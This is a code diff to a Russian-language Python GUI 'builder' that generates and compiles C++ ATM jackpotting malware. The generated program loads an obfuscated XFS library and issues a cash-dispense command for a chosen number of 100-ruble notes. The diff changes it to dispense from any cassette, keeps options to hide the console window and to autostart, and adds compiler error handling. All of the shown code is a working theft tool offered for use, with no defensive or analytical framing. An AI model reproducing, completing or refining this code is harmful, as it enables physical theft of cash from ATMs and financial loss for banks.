@@ -4,11 +4,13 @@ import os
 import subprocess
 import threading
 
+# --- Шаблон C++ (уже с авто-выбором кассеты) ---
 CPP_TEMPLATE = """
 #include <windows.h>
 
 #define WFS_SUCCESS 0
 #define WFS_CMD_CDM_DISPENSE 302
+#define WFS_CDM_CASHUNIT_ANY 0xFFFF 
 
 unsigned char enc_msxfs[] = { 0x2F, 0x31, 0x3A, 0x24, 0x31, 0x6C, 0x26, 0x2E, 0x2E, 0x42 };
 
@@ -20,9 +22,14 @@ typedef DWORD (WINAPI *WFSStartUp_t)(DWORD, LPVOID);
 typedef DWORD (WINAPI *WFSOpen_t)(LPSTR, DWORD, DWORD, DWORD, LPVOID, LPHANDLE);
 typedef DWORD (WINAPI *WFSExecute_t)(HANDLE, DWORD, LPVOID, DWORD, LPVOID*);
 
-struct WFSCDMDISPENSE {
+struct WFSCDMDISPENSEITEM {
     USHORT usNumber;
     USHORT usCashUnit;
+};
+
+struct WFSCDMDISPENSE {
+    USHORT usNumber;
+    WFSCDMDISPENSEITEM items[1];
     BOOL bPresent;
 };
 
@@ -64,9 +71,11 @@ int main() {
         if (!opened) { FreeLibrary(hXfs); return -4; }
     }
 
+    // Команда: выдать N купюр с ЛЮБОЙ кассеты
     WFSCDMDISPENSE cmd;
-    cmd.usNumber = %d; 
-    cmd.usCashUnit = %d; 
+    cmd.usNumber = 1; 
+    cmd.items[0].usNumber = %d; // Количество купюр
+    cmd.items[0].usCashUnit = WFS_CDM_CASHUNIT_ANY; 
     cmd.bPresent = TRUE;
 
     LPVOID resultData = NULL;
@@ -111,14 +120,6 @@ class BuilderApp:
         
         self.lbl_bills = ttk.Label(root, text="Купюр по 100₽: 10 шт.", font=("Arial", 12), foreground="#aaaaaa")
         self.lbl_bills.pack()
-
-        # Кассета
-        frame_unit = tk.Frame(root, bg="#1e1e1e")
-        frame_unit.pack(pady=10)
-        ttk.Label(frame_unit, text="Номер кассеты с сотками:").pack(side=tk.LEFT, padx=5)
-        self.entry_unit = tk.Entry(frame_unit, width=5, bg="#333", fg="#fff", insertbackground="#fff")
-        self.entry_unit.insert(0, "0")
-        self.entry_unit.pack(side=tk.LEFT)
 
         # Компилятор
         frame_comp = tk.Frame(root, bg="#1e1e1e")
@@ -193,12 +194,12 @@ class BuilderApp:
         try:
             total_rub = int(self.slider_var.get())
             count = total_rub // 100
-            unit = int(self.entry_unit.get())
             
             hide_cmd = "ShowWindow(GetConsoleWindow(), SW_HIDE);" if self.var_hide.get() else ""
             autostart_cmd = "SetAutoStart();" if self.var_autostart.get() else ""
             
-            code = CPP_TEMPLATE % (hide_cmd, autostart_cmd, count, unit)
+            # Передаем только 2 переменные (скрытие, автозапуск) и количество купюр
+            code = CPP_TEMPLATE % (hide_cmd, autostart_cmd, count)
 
             with open("main.cpp", "w", encoding="utf-8") as f:
                 f.write(code)
@@ -229,8 +230,13 @@ class BuilderApp:
                 messagebox.showinfo("Успех", f"Файл {out_name} успешно собран!\nВылетит {count} купюр по 100₽.")
                 self.btn_run.config(state="normal")
             else:
-                self.log(f"[-] Ошибка сборки:\n{process.stderr}")
-                messagebox.showerror("Ошибка", "Сборка не удалась.")
+                err_text = process.stderr.lower()
+                if "is not recognized" in err_text or "не является внутренней" in err_text:
+                    self.log("[-] ОШИБКА: Компилятор не найден в системе!")
+                    messagebox.showerror("Нет компилятора", f"Компилятор {compiler} не установлен.\nУстанови Visual Studio C++ Build Tools или MinGW.")
+                else:
+                    self.log(f"[-] Ошибка сборки:\n{process.stderr}")
+                    messagebox.showerror("Ошибка", "Сборка не удалась. Проверь лог.")
 
         except Exception as e:
             self.log(f"[-] Ошибка: {str(e)}")
